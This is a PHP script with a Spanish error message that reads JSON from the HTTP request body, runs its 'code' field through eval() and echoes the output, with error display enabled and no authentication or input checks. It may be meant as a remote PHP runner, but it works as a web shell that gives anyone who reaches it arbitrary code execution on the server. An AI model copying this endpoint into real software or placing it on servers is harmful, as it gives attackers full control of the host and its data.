<?php
error_reporting(E_ALL);
ini_set('display_errors', '1');
$data = json_decode(file_get_contents("php://input"), true);

if (isset($data['code'])) {
    ob_start();
    eval($data['code']);
    $output = ob_get_clean();
    echo $output;
} else {
    echo "Error: No se proporcionó código PHP.";
}
?>
